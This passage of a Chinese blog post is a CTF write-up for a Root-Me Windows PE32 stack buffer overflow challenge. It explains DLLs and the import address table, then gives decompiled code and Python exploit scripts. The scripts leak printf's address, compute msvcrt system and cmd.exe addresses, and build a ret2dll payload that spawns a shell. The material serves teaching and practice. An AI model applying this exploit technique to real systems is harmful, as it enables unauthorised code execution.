+<p><a target="_blank" rel="noopener" href="https://www.root-me.org/fr/Challenges/App-Systeme/PE32-Stack-buffer-overflow-avance">题目地址</a>，题目源码需要攻击成功之后才可以查看</p>
+<p>在做这个题目前先理解一下什么是dll，DLL的全称是Dynamic Link Library，中文叫做“动态链接文件”，在Windows操作系统中，DLL对于程序执行是非常重要的，因为程序在执行的时候，必须链接到DLL文件，才能够正确地运行。而有些DLL文件可以被许多程序共用。因此, 程序设计人员可以利用DLL文件, 使程序不至于太过巨大。</p>
+<p>这测试一下，写一个test.c</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> {</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"hello wrold"</span>);</span><br><span class="line">	system(<span class="string">"pause"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>接着用<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/process-explorer">进程资源管理器</a>这个工具查看test.exe的dll有哪些</p>
+<img src="/2022/11/30/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/2.png" alt="1" style="zoom: 33%;">
+
+<p>看到了几个经常看见的dll，<code>ntdll.dll</code>, <code>kernel32.dll</code>, <code>KernelBase.dll</code>, <code>ucrtbase.dll</code></p>
+<ul>
+<li>ntdll.dll：ntdll.dll是重要的Windows NT内核级文件。描述了windows本地NTAPI的接口。当Windows启动时，ntdll.dll就驻留在内存中特定的写保护区域，使别的程序无法占用这个内存区域。是Windows系统从ring3到ring0的入口，位于Kernel32.dll和user32.dll中的所有win32 API 最终都是调用ntdll.dll中的函数实现的。ntdll.dll中的函数使用SYSENTRY进入ring0，函数的实现实体在ring0中</li>
+<li>kernel32.dll：kernel32.dll是非常重要的32位动态链接库文件，属于内核级文件。它控制着系统的内存管理、数据的输入输出操作和中断处理，当Windows启动时，kernel32.dll就驻留在内存中特定的写保护区域，使别的程序无法占用这个内存区域</li>
+<li>KernelBase.dll：系统文件kernelbase.dll是存放在Windows系统文件夹中的重要文件，通常情况下是在安装操作系统过程中自动创建的，对于系统正常运行来说至关重要</li>
+<li>ucrtbase.dll：在介绍ucrtbase.dll前先看一下msvcrt.dll是啥，msvcrt.dll是微软在windows操作系统中提供的C语言运行库执行文件（Microsoft Visual C Runtime Library)，其中提供了printf,malloc,strcpy等C语言库函数的具体运行实现，这个和libc.so很像。ucrtbase.dll其实就是把<code>msvcrt.dll</code>拆开了，主要的c运行时的代码放在了<code>ucrtbase.dll</code>中</li>
+</ul>
+<img src="/2022/11/30/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/3.png" alt="1" style="zoom: 33%;">
+
+<p>整个调用链如上</p>
+<p>现在回到题目，ida反汇编之后如下</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  FILE *v4; <span class="comment">// [esp+1Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  __main();</span><br><span class="line">  <span class="keyword">if</span> ( argc &lt;= <span class="number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">fprintf</span>(&amp;__iob[<span class="number">2</span>], <span class="string">"Usage: %s &lt;filename&gt;\n"</span>, *argv);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  }</span><br><span class="line">  v4 = fopen(argv[<span class="number">1</span>], <span class="string">"r"</span>);</span><br><span class="line">  manage_file(v4, (<span class="type">char</span> *)argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>会把argv转入的filename通过fopen打开，传入到<code>manage_file</code>函数中，跟进</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __usercall manage_file@&lt;eax&gt;(<span class="type">int</span> a1@&lt;eax&gt;, FILE *Stream, <span class="type">char</span> *FileName)</span><br><span class="line">{</span><br><span class="line">  <span class="type">void</span> *v3; <span class="comment">// esp</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> DstBuf[<span class="number">8192</span>]; <span class="comment">// [esp+14h] [ebp-a] BYREF</span></span><br><span class="line">  <span class="type">int</span> FileHandle; <span class="comment">// [esp+2014h] [ebp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> MaxCharCount; <span class="comment">// [esp+2018h] [ebp-10h]</span></span><br><span class="line">  FILE *v11; <span class="comment">// [esp+201Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = alloca(a1);</span><br><span class="line">  <span class="built_in">memset</span>(DstBuf, <span class="number">0</span>, <span class="keyword">sizeof</span>(DstBuf));</span><br><span class="line">  v11 = Stream;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"File name: %s\n"</span>, FileName);</span><br><span class="line">  fseek(Stream, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">  MaxCharCount = ftell(Stream);</span><br><span class="line">  rewind(Stream);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"File size: %d\n"</span>, MaxCharCount);</span><br><span class="line">  FileHandle = open(FileName, <span class="number">0</span>);</span><br><span class="line">  read(FileHandle, DstBuf, MaxCharCount);</span><br><span class="line">  close(FileHandle);</span><br><span class="line">  v4 = count_chars(DstBuf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Alphanumerical chars: %d\n"</span>, v4);</span><br><span class="line">  v5 = count_words(DstBuf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Words: %d\n"</span>, v5);</span><br><span class="line">  v6 = count_lines(DstBuf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Lines: %d\n"</span>, v6);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"File pointer: %p\n"</span>, v11);</span><br><span class="line">  <span class="keyword">return</span> fclose(v11);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>首先会输出文件名，接着会把文件大小给输出，然后打开文件通过read将文件里面的内容输入到<code>DstBuf</code>这个变量中，值得注意的是并没有对大小进行限制，导致栈溢出的发生，但是还有一个点是需要注意的，fclose(v11)这个v11直接栈溢出的话会被覆盖掉最后会导致失败，所以需要把v11先给泄露出来然后栈溢出的时候把v11还给覆盖成正常的pointer即可</p>
+<p>所以先随便写一个文件然后运行一下输出一下<code>File pointer</code></p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PS ch73&gt; echo a &gt; p1</span><br><span class="line">PS ch73&gt; .\ch73.exe p1</span><br><span class="line">File name: p1</span><br><span class="line">File size: <span class="number">8</span></span><br><span class="line">Alphanumerical chars: <span class="number">1</span></span><br><span class="line">Words: <span class="number">1</span></span><br><span class="line">Lines: <span class="number">0</span></span><br><span class="line">File pointer: <span class="number">75E2</span>D660</span><br></pre></td></tr></tbody></table></figure>
+
+<p>拿到<code>pointer</code>之后就可以构造第二个payload了，因为这个程序没有system函数，但是我们需要getshell所以不得不寻找system，在glibc pwn中，可以使用ret2libc的攻击手法，在win中通过上面的介绍<code>msvcrt.dll</code>里提供了具体的实现，所以也是有ret2dll的攻击方法，原理和ret2libc差不多</p>
+<p>在win中并没有plt和got表这个概念，但是DLL也用到了类似GOT的方法，称为<strong>导入地址数组</strong>（<strong>Import Address Table，IAT</strong>），IAT和GOT非常类似，IAT中表项对应本模块中用到的外部符号的真实地址，初始为空（也不算为空），在装载后由动态链接器更新为真实地址。在ida中可以看到位于.idata段中</p>
+<img src="/2022/11/30/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/4.png" alt="1" style="zoom: 50%;">
+
+<p>plt其实可以看成下图的地址</p>
+<img src="/2022/11/30/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/5.png" alt="1" style="zoom: 50%;">
+
+<p>接下来构造第二个payload，也就是输出printf的真实地址，exp如下</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> winpwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">printf_plt = <span class="number">0x402974</span></span><br><span class="line">printf_got = <span class="number">0x406200</span></span><br><span class="line"></span><br><span class="line">p1 = p32(<span class="number">0x75E2D660</span>) * <span class="number">2053</span></span><br><span class="line">p1 += p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">p1 += p32(printf_plt)</span><br><span class="line">p1 += p32(<span class="number">0x004016E3</span>)</span><br><span class="line">p1 += p32(printf_got)</span><br><span class="line"></span><br><span class="line">p1 = [<span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> p1]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">'./p2'</span>, <span class="string">'wb+'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="built_in">bytes</span>(p1))</span><br><span class="line"></span><br><span class="line">f.close()</span><br></pre></td></tr></tbody></table></figure>
+
+<p>运行之后最后那一串就是printf的真实地址，因为是argv这种参数，所以接收地址不是很好接收，winpwn自动化没有输出（很奇怪），所以笔者就用动态调试exp来获得printf的真实地址，这里笔者用的ida调试的</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PS ch73&gt; .\ch73.exe p2</span><br><span class="line">File name: p2</span><br><span class="line">File size: <span class="number">8228</span></span><br><span class="line">Alphanumerical chars: <span class="number">2054</span></span><br><span class="line">Words: <span class="number">1</span></span><br><span class="line">Lines: <span class="number">0</span></span><br><span class="line">File pointer: <span class="number">75E2</span>D660</span><br><span class="line">pV觰PW觰癢觰 Y觰PY觰€[觰File name: 兡[?垭壝岰?卲*@</span><br></pre></td></tr></tbody></table></figure>
+
+<p>在<code>401825</code>这里下个断点然后，在debug里面选择本地，找到程序后Parameters里面放入p2也就是argv，然后开始调试</p>
+<img src="/2022/11/30/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/6.png" alt="1" style="zoom:67%;">
+
+<p>到断点那里，然后g搜索到<code>406200</code>这个地址，这个里面就存放的是printf的真实地址</p>
+<img src="/2022/11/30/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/7.png" alt="1" style="zoom: 50%;">
+
+<p>拿到printf真实的地址之后就需要算dll的base，在笔者的虚拟机里<code>msvcrt.dll</code>是在<code>C:\Windows\SyChpe32\msvcrt.dll</code>但是笔者在实机上测的时候这个程序的dll在 <code>C:\WINDOWS\SysWOW64\msvcrt.dll</code>这里</p>
+<p>把dll文件拖到ida中，搜索printf在dll里面的偏移算出dll_base，还有system以及cmd.exe的偏移并算出真实地址</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">printf_addr = <span class="number">0x75D35670</span></span><br><span class="line"></span><br><span class="line">dll_base = printf_addr - <span class="number">0x10105670</span></span><br><span class="line">system_addr = dll_base + <span class="number">0x10105A70</span></span><br><span class="line"></span><br><span class="line">cmd_addr = dll_base + <span class="number">0x1010D158</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>最后再构造getshell的payload如下</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">p1 = p32(<span class="number">0x75E2D660</span>) * <span class="number">2053</span></span><br><span class="line">p1 += p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">p1 += p32(system_addr)</span><br><span class="line">p1 += p32(<span class="number">0x004016E3</span>)</span><br><span class="line">p1 += p32(cmd_addr)</span><br><span class="line"></span><br><span class="line">p1 = [<span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> p1]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">'./p3'</span>, <span class="string">'wb+'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="built_in">bytes</span>(p1))</span><br><span class="line"></span><br><span class="line">f.close()</span><br></pre></td></tr></tbody></table></figure>
+
+<p>运行即可getshell</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PS ch73&gt; .\ch73.exe p3</span><br><span class="line">File name: p3</span><br><span class="line">File size: <span class="number">8228</span></span><br><span class="line">Alphanumerical chars: <span class="number">2056</span></span><br><span class="line">Words: <span class="number">1</span></span><br><span class="line">Lines: <span class="number">0</span></span><br><span class="line">File pointer: <span class="number">75E2</span>D660</span><br><span class="line">Microsoft Windows [版本 <span class="number">10.0</span><span class="number">.22000</span><span class="number">.1219</span>]</span><br><span class="line">(c) Microsoft Corporation。保留所有权利。</span><br></pre></td></tr></tbody></table></figure>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这里笔者学习了IAT表和作用，还有argv参数的调试，坑点是<code>msvcrt.dll</code>这个文件位置需要根着自己本机的程序来确定，笔者卡在这里一段时间，最后想了一下把程序在ida中调试了一下才发现<code>msvcrt.dll</code>的位置和网上的wp有些不一样</p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/406236763">https://zhuanlan.zhihu.com/p/406236763</a></p>
+<p><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/ntdll.dll/10959419">https://baike.baidu.com/item/ntdll.dll/10959419</a></p>
+<p><a target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/07/09/winpwn/">https://xuanxuanblingbling.github.io/ctf/pwn/2020/07/09/winpwn/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.polarxiong.com/archives/%E5%A6%82%E4%BD%95%E7%90%86%E8%A7%A3DLL%E4%B8%8D%E6%98%AF%E5%9C%B0%E5%9D%80%E6%97%A0%E5%85%B3%E7%9A%84-DLL%E4%B8%8EELF%E7%9A%84%E5%AF%B9%E6%AF%94%E5%88%86%E6%9E%90.html">https://www.polarxiong.com/archives/%E5%A6%82%E4%BD%95%E7%90%86%E8%A7%A3DLL%E4%B8%8D%E6%98%AF%E5%9C%B0%E5%9D%80%E6%97%A0%E5%85%B3%E7%9A%84-DLL%E4%B8%8EELF%E7%9A%84%E5%AF%B9%E6%AF%94%E5%88%86%E6%9E%90.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/210394">https://www.anquanke.com/post/id/210394</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/z1r00?tab=repositories">Projects</a></li>
+         
+          <li><a href="/links/">links</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">win pwn初探（二）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8pwntools%E7%BC%96%E5%86%99exp"><span class="toc-number">1.1.</span> <span class="toc-text">利用pwntools编写exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E5%90%88pwntools%E8%BF%9B%E8%A1%8C%E8%B0%83%E8%AF%95"><span class="toc-number">1.2.</span> <span class="toc-text">结合pwntools进行调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8winpwn%E6%A8%A1%E5%9D%97%E8%BF%9B%E8%A1%8C%E8%B0%83%E8%AF%95"><span class="toc-number">1.3.</span> <span class="toc-text">利用winpwn模块进行调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2dll"><span class="toc-number">1.4.</span> <span class="toc-text">ret2dll</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.5.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">1.6.</span> <span class="toc-text">Reference</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/11/30/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/11/30/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/&amp;text=win pwn初探（二）"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/11/30/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/&amp;title=win pwn初探（二）"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/11/30/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/&amp;is_video=false&amp;description=win pwn初探（二）"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=win pwn初探（二）&amp;body=Check out this article: http://example.com/2022/11/30/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/11/30/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/&amp;title=win pwn初探（二）"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/11/30/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/&amp;title=win pwn初探（二）"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/11/30/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/&amp;title=win pwn初探（二）"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/11/30/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/&amp;title=win pwn初探（二）"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/11/30/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/&amp;name=win pwn初探（二）&amp;description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/11/30/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/&amp;t=win pwn初探（二）"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright ©
+    
+    
+    2021-2023
+    z1r0
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/z1r00?tab=repositories">Projects</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'">
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+
+<script type="text/javascript" charset="utf-8" src="/js/lazyload-plugin/lazyload.intersectionObserver.min.js"></script></body></html>
